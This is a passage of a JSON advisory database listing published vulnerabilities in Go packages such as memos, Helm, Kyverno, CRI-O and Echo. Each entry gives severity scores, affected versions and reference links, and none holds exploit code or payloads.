"github_reviewed": true, "github_reviewed_at": "2022-12-30T18:54:08Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-87mm-qxm5-cp3f", "modified": "2022-12-29T00:34:38Z", "published": "2022-12-28T03:30:28Z", "aliases": ["CVE-2022-3346"], "summary": "go-resolver vulnerable to attacker-controlled domains due to unvalidated RRSIG RRs", "details": "go-resolver's DNSSEC validation is not performed correctly. An attacker can cause this package to report successful validation for invalid, attacker-controlled records. The owner name of RRSIG RRs is not validated, permitting an attacker to present the RRSIG for an attacker-controlled domain in a response for any other domain.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/peterzen/goresolver"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "1.0.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-3346"}, {"type": "WEB", "url": "https://github.com/peterzen/goresolver/issues/5"}, {"type": "PACKAGE", "url": "https://github.com/peterzen/goresolver"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0979"}], "database_specific": {"cwe_ids": ["CWE-345"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-29T00:34:38Z", "nvd_published_at": "2022-12-28T03:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qw36-rw5q-gxcq", "modified": "2023-01-10T15:47:06Z", "published": "2022-12-28T15:30:45Z", "aliases": ["CVE-2022-4804"], "summary": "usememos/memos Improper Authorization vulnerability", "details": "usememos/memos 0.9.0 and prior is vulnerable to Improper Authorization.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4804"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/3556ae4e651d9443dc3bb8a170dd3cc726517a53"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/4ee48a1e-6332-4d95-a360-9c392643c533"}], "database_specific": {"cwe_ids": ["CWE-285"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:58:34Z", "nvd_published_at": "2022-12-28T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-967g-cjx4-h7j6", "modified": "2023-02-09T21:40:05Z", "published": "2022-12-28T00:30:23Z", "aliases": ["CVE-2022-2584"], "summary": "go-codec-dagpb vulnerable to panic when decoding invalid blocks", "details": "go-codec-dagpb is an implementation of the DAG-PB spec for Go. The dag-pb codec can panic when decoding invalid blocks. This issue has been patched in version 1.3.1.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ipld/go-codec-dagpb"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-2584"}, {"type": "WEB", "url": "https://github.com/ipld/go-codec-dagpb/commit/a17ace35cc760a2698645c09868f9050fa219f57"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0422"}, {"type": "PACKAGE", "url": "github.com/ipld/go-codec-dagpb"}], "database_specific": {"cwe_ids": ["CWE-119"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-29T01:51:36Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-r3p3-5f35-h6mf", "modified": "2023-01-09T20:06:47Z", "published": "2022-12-28T15:30:46Z", "aliases": ["CVE-2022-4808"], "summary": "usememos/memos Improper Privilege Management vulnerability", "details": "Improper Privilege Management in GitHub repository usememos/memos prior to 0.9.1.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4808"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/3556ae4e651d9443dc3bb8a170dd3cc726517a53"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/11877cbf-fcaf-42ef-813e-502c7293f2b5"}], "database_specific": {"cwe_ids": ["CWE-269"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2023-01-09T20:06:47Z", "nvd_published_at": "2022-12-28T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-w57v-6xp4-rm2v", "modified": "2023-01-02T20:15:37Z", "published": "2022-12-23T12:30:25Z", "aliases": ["CVE-2022-4689"], "summary": "usememos/memos vulnerable to account takeover due to improper access control", "details": "usememos/memos is an open-source, self-hosted memo hub with knowledge management and socialization. Versions prior to 0.9.0 improperly maintain access control allowing an attacker to take over an account by changing header values in the HTTP request.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4689"}, {"type": "WEB", "url": "https://github.com/usememos/memos/pull/831"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/dca35bde877aab6e64ef51b52e590b5d48f692f9"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/a78c4326-6e7b-47fe-aa82-461e5c12a4e3"}], "database_specific": {"cwe_ids": ["CWE-284"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-27T01:57:10Z", "nvd_published_at": "2022-12-23T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-f5c5-hmw9-v8hx", "modified": "2023-08-30T11:48:44Z", "published": "2022-12-28T00:30:23Z", "aliases": ["CVE-2020-36561"], "summary": "Unzip vulnerable to path traversal", "details": "Due to improper path sanitization, archives containing relative file paths can cause files to be written (or overwritten) outside of the target directory.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/yi-ge/unzip"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.3-0.20200308084313-2adbaa4891b9"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-36561"}, {"type": "WEB", "url": "https://github.com/yi-ge/unzip/pull/1"}, {"type": "WEB", "url": "https://github.com/yi-ge/unzip/commit/2adbaa4891b9690853ef10216189189f5ad7dc73"}, {"type": "PACKAGE", "url": "https://github.com/yi-ge/unzip"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0035"}, {"type": "WEB", "url": "https://snyk.io/research/zip-slip-vulnerability"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:07:02Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6cr6-fmvc-vw2p", "modified": "2023-02-09T21:41:23Z", "published": "2022-12-28T00:30:23Z", "aliases": ["CVE-2021-4239"], "summary": "Noise vulnerable to denial of service", "details": "Noise is a Go implementation of the Noise Protocol Framework. The Noise protocol implementation suffers from weakened cryptographic security after encrypting 2^64 messages, and a potential denial of service attack. After 2^64 (~18.4 quintillion) messages are encrypted with the Encrypt function, the nonce counter will wrap around, causing multiple messages to be encrypted with the same key and nonce. In a separate issue, the Decrypt function increments the nonce state even when it fails to decrypt a message. If an attacker can provide an invalid input to the Decrypt function, this will cause the nonce state to desynchronize between the peers, resulting in a failure to encrypt all subsequent messages.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/flynn/noise"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.0.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-4239"}, {"type": "WEB", "url": "https://github.com/flynn/noise/pull/44"}, {"type": "WEB", "url": "https://github.com/flynn/noise/commit/2499bf1bad239a8316c32932a993642350b3afdb"}, {"type": "PACKAGE", "url": "https://github.com/flynn/noise"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0425"}], "database_specific": {"cwe_ids": ["CWE-311"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-29T01:52:11Z", "nvd_published_at": "2022-12-27T22:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-42q2-m54f-jh95", "modified": "2023-01-10T15:47:45Z", "published": "2022-12-29T18:30:23Z", "aliases": ["CVE-2022-4851"], "summary": "sememos/memos vulnerable to Improper Handling of Values", "details": "In usememos/memos 0.9.0 and prior, an attacker can post malicious content to another user's memos page via POST request.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4851"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/3556ae4e651d9443dc3bb8a170dd3cc726517a53"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/e3cebc1a-1326-4a08-abad-0414a717fa0f"}], "database_specific": {"cwe_ids": ["CWE-229"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T22:23:38Z", "nvd_published_at": "2022-12-29T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-33m8-f4hw-wm3q", "modified": "2023-01-10T15:38:13Z", "published": "2022-12-27T15:30:18Z", "aliases": ["CVE-2022-4767"], "summary": "usememos/memos Denial of Service vulnerability", "details": "Denial of Service in GitHub repository usememos/memos 0.9.0 and prior. A patch is available on the `main` branch at commit number f888c628408501daf639de07b90a72ab443b0f4c.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4767"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/f888c628408501daf639de07b90a72ab443b0f4c"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/75b4a085-923c-4ecc-bbf6-e049290db502"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-30T17:48:50Z", "nvd_published_at": "2022-12-27T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-rgj5-jj5q-v3v7", "modified": "2022-12-23T21:53:07Z", "published": "2022-12-19T12:30:23Z", "aliases": ["CVE-2022-4609"], "summary": "Memos Cross-site Scripting vulnerability", "details": "Memos, an open-source, self-hosted memo hub, is vulnerable to stored Cross-site Scripting (XSS) in versions 0.8.3 and prior. A patch is available and anticipated to be part of version 0.9.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.8.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4609"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/726285e63467820f94cbf872abe71025a161c212"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/5b3115c5-776c-43d3-a7be-c8dc13ab81ce"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-19T18:20:07Z", "nvd_published_at": "2022-12-19T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-f93f-55c2-8c89", "modified": "2022-12-08T15:33:38Z", "published": "2022-12-07T03:30:18Z", "aliases": ["CVE-2022-44942"], "summary": "Casdoor arbitrary file deletion vulnerability via uploadFile function", "details": "Casdoor before v1.126.1 was discovered to contain an arbitrary file deletion vulnerability via the `uploadFile` function.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/casdoor/casdoor"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.126.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-44942"}, {"type": "WEB", "url": "https://github.com/casdoor/casdoor/issues/1171"}, {"type": "WEB", "url": "https://github.com/casdoor/casdoor/pull/1174"}, {"type": "PACKAGE", "url": "https://github.com/casdoor/casdoor"}, {"type": "WEB", "url": "https://github.com/casdoor/casdoor/releases/tag/v1.126.1"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-07T14:15:45Z", "nvd_published_at": "2022-12-07T02:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-j593-h5v3-45x6", "modified": "2023-01-10T15:38:25Z", "published": "2022-12-27T15:30:19Z", "aliases": ["CVE-2022-4734"], "summary": "usememos/memos may leak user information to an authenticated user", "details": "usememos/memos 0.9.0 and prior has endpoint that leaks user information like names, email, role, and OpenID to an authenticated user. A patch is available at commit 05b41804e33a34102f1f75bb2d69195dda6a1210 on the `main` branch.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4734"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/05b41804e33a34102f1f75bb2d69195dda6a1210"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/4b4421dc-73af-4dec-884c-836f9732cb5b"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-212"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T17:56:48Z", "nvd_published_at": "2022-12-27T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6rx9-889q-vv2r", "modified": "2022-12-20T19:06:38Z", "published": "2022-12-14T21:36:56Z", "aliases": ["CVE-2022-23524"], "summary": "Helm vulnerable to denial of service through string value parsing", "details": "Fuzz testing, by Ada Logics and sponsored by the CNCF, identified input to functions in the _strvals_ package that can cause a stack overflow. In Go, a stack overflow cannot be recovered from. Applications that use functions from the _strvals_ package in the Helm SDK can have a Denial of Service attack when they use this package and it panics.\n\n### Impact\n\nThe _strvals_ package contains a parser that turns strings into Go structures. For example, the Helm client has command line flags like `--set`, `--set-string`, and others that enable the user to pass in strings that are merged into the values. The _strvals_ package converts these strings into structures Go can work with. Some string inputs can cause array data structures to be created causing a stack overflow.\n\nApplications that use the _strvals_ package in the Helm SDK to parse user supplied input can suffer a Denial of Service when that input causes a panic that cannot be recovered from.\n\nThe Helm Client will panic with input to `--set`, `--set-string`, and other value setting flags that causes a stack overflow. Helm is not a long running service so the panic will not affect future uses of the Helm client.\n\n### Patches\n\nThis issue has been resolved in 3.10.3. \n\n### Workarounds\n\nSDK users can validate strings supplied by users won't create large arrays causing significant memory usage before passing them to the _strvals_ functions.\n\n### For more information\n\nHelm's security policy is spelled out in detail in our [SECURITY](https://github.com/helm/community/blob/master/SECURITY.md) document.\n\n### Credits\n\nDisclosed by Ada Logics in a fuzzing audit sponsored by CNCF.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "helm.sh/helm/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.10.3"}]}], "database_specific": {"last_known_affected_version_range": "<= 3.10.2"}}], "references": [{"type": "WEB", "url": "https://github.com/helm/helm/security/advisories/GHSA-6rx9-889q-vv2r"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23524"}, {"type": "WEB", "url": "https://github.com/helm/helm/commit/3636f6824757ff734cb265b8770efe48c1fb3737"}, {"type": "PACKAGE", "url": "https://github.com/helm/helm"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1167"}], "database_specific": {"cwe_ids": ["CWE-400"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-14T21:36:56Z", "nvd_published_at": "2022-12-15T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m3cq-xcx9-3gvm", "modified": "2023-08-29T22:40:39Z", "published": "2022-12-21T17:24:10Z", "aliases": ["CVE-2022-47633"], "summary": "kyverno verifyImages rule bypass possible with malicious proxy/registry", "details": "### Impact\n\nUsers of Kyverno on versions 1.8.3 or 1.8.4 who use `verifyImages` rules to verify container image signatures, and do not prevent use of unknown registries.\n\n### Patches\n\nThis issue has been fixed in version [1.8.5](https://github.com/kyverno/kyverno/releases/tag/v1.8.5)\n\n### Workarounds\n\nConfigure a Kyverno policy to restrict registries to a set of secure trusted image registries ([sample](https://kyverno.io/policies/best-practices/restrict_image_registries/restrict_image_registries/)).\n\n### References\n\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kyverno/kyverno"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.8.3"}, {"fixed": "1.8.5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/kyverno/kyverno/security/advisories/GHSA-m3cq-xcx9-3gvm"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-47633"}, {"type": "WEB", "url": "https://github.com/kyverno/kyverno/pull/5713"}, {"type": "PACKAGE", "url": "https://github.com/kyverno/kyverno"}, {"type": "WEB", "url": "https://github.com/kyverno/kyverno/compare/v1.8.4...v1.8.5"}, {"type": "WEB", "url": "https://github.com/kyverno/kyverno/releases/tag/v1.8.5"}, {"type": "WEB", "url": "https://kyverno.io/docs/writing-policies/verify-images/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1180"}, {"type": "WEB", "url": "https://web.archive.org/web/20230426095744/https://kyverno.io/policies/best-practices/restrict_image_registries/restrict_image_registries/"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-12-21T17:24:10Z", "nvd_published_at": "2022-12-23T23:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cm9x-c3rh-7rc4", "modified": "2022-12-29T01:49:47Z", "published": "2022-12-29T01:49:47Z", "aliases": ["CVE-2022-4318"], "summary": "CRI-O vulnerable to /etc/passwd tampering resulting in Privilege Escalation", "details": "### Impact\nIt is possible to craft an environment variable with newlines to add entries to a container's /etc/passwd. It is possible to circumvent admission validation of username/UID by adding such an entry.\n\nNote: because the pod author is in control of the container's /etc/passwd, this is not considered a new risk factor. However, this advisory is being opened for transparency and as a way of tracking fixes.\n\n### Patches\n1.26.0 will have the fix. More patches will be posted as they're available.\n\n### Workarounds\nAdditional security controls like SELinux should prevent any damage a container is able to do with root on the host. Using SELinux is recommended because this class of attack is already possible by manually editing the container's /etc/passwd \n\n### References\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:C/C:L/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cri-o/cri-o"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.26.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cri-o/cri-o/security/advisories/GHSA-cm9x-c3rh-7rc4"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4318"}, {"type": "WEB", "url": "https://github.com/cri-o/cri-o/pull/6450"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2023:1033"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2023:1503"}, {"type": "WEB", "url": "https://access.redhat.com/security/cve/CVE-2022-4318"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2152703"}, {"type": "PACKAGE", "url": "https://github.com/cri-o/cri-o"}], "database_specific": {"cwe_ids": ["CWE-913"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-29T01:49:47Z", "nvd_published_at": "2023-09-25T20:15:10Z"}}, {"schema_version": "1.4.0", "id": "GHSA-cwrm-33qq-4w2x", "modified": "2023-01-10T00:53:06Z", "published": "2022-12-29T18:30:24Z", "aliases": ["CVE-2022-4846"], "summary": "usememos/memos Cross-Site Request Forgery vulnerability", "details": "Cross-Site Request Forgery (CSRF) in GitHub repository usememos/memos 0.9.0 and prior.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "0.9.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4846"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/c9bb2b785dc5852655405d5c9ab127a2d5aa3948"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/38c685fc-7065-472d-a46e-e26bf0b556d3"}], "database_specific": {"cwe_ids": ["CWE-352"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T22:53:12Z", "nvd_published_at": "2022-12-29T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mq5q-gpgv-pwxw", "modified": "2023-01-10T15:41:58Z", "published": "2022-12-28T15:30:46Z", "aliases": ["CVE-2022-4805"], "summary": "usememos/memos Incorrect Use of Privileged APIs vulnerability", "details": "In usememos/memos 0.9.0 and prior, a user can archive any private memos, delete any shortcut, and edit any shortcut from other users via API.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4805"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/3556ae4e651d9443dc3bb8a170dd3cc726517a53"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/b03f6a9b-e49b-42d6-a318-1d7afd985873"}], "database_specific": {"cwe_ids": ["CWE-648"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:58:45Z", "nvd_published_at": "2022-12-28T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mfvq-m3jj-8864", "modified": "2023-01-10T15:40:34Z", "published": "2022-12-28T15:30:45Z", "aliases": ["CVE-2022-4800"], "summary": "usememos/memos vulnerable to Improper Verification of Source of a Communication Channel", "details": "usememos/memos 0.9.0 and prior is vulnerable to Improper Verification of Source of a Communication Channel.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.1"}]}], "database_specific": {"last_known_affected_version_range": "<= 0.9.0"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4800"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/3556ae4e651d9443dc3bb8a170dd3cc726517a53"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/aa45a6eb-cc38-45e5-a301-221ef43c0ef8"}], "database_specific": {"cwe_ids": ["CWE-940"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-30T19:57:43Z", "nvd_published_at": "2022-12-28T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qcw2-492v-57xj", "modified": "2023-01-02T20:22:05Z", "published": "2022-12-23T12:30:25Z", "aliases": ["CVE-2022-4683"], "summary": "usememos/memos missing Secure cookie attribute", "details": "usememos/memos is an open-source, self-hosted memo hub with knowledge management and socialization. Memos prior to 0.9.0 is missing the Secure cookie attribute, making it vulnerable to session hijacking.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/usememos/memos"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.9.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-4683"}, {"type": "WEB", "url": "https://github.com/usememos/memos/commit/7efa749c6628c75b19a912ca170529f5c293bb2e"}, {"type": "PACKAGE", "url": "https://github.com/usememos/memos"}, {"type": "WEB", "url": "https://huntr.dev/bounties/84973f6b-739a-4d7e-8757-fc58cbbaf6ef"}], "database_specific": {"cwe_ids": ["CWE-311", "CWE-319", "CWE-614"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-27T02:21:22Z", "nvd_published_at": "2022-12-23T12:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-j453-hm5x-c46w", "modified": "2022-12-12T20:48:00Z", "published": "2022-12-07T18:30:26Z", "aliases": ["CVE-2020-36565"], "summary": "Echo vulnerable to directory traversal", "details": "Due to improper sanitization of user input on Windows, the static file handler allows for directory traversal, allowing an attacker to read files outside of the target directory that the server has permission to read.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/labstack/echo/v4"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "4.2.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-36565"}, {"type": "WEB", "url": "https://github.com/labstack/echo/pull/1718"}, {"type": "WEB", "url": "https://github.com/labstack/echo/commit/4422e3b66b9fd498ed1ae1d0242d660d0ed3faaa"}, {"type": "PACKAGE", "url": "https://github.com/labstack/echo"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0051"}], "database_specific": {"cwe_ids": ["CWE-22"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-12-07T20:46:25Z", "nvd_published_at": "2022-12-07T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h4q8-96p6-jcgr", "modified": "2022-12-19T22:48:32Z", "published": "2022-12-19T22:48:32Z", "aliases": ["CVE-2022-39304"], "summary": "ghinstallation returns app JWT in error responses", "details": "### Impact\n\nIn ghinstallation v1, when the request to refresh an installation token failed, the HTTP request and response would be returned for debugging.\n\nhttps://github.com/bradleyfalzon/ghinstallation/blob/24e56b3fb7669f209134a01eff731d7e2ef72a5c/transport.go#L172-L174\n\nThe request contained the bearer JWT for the App, and was returned back to clients. This token is short lived (10 minute maximum).\n\n### 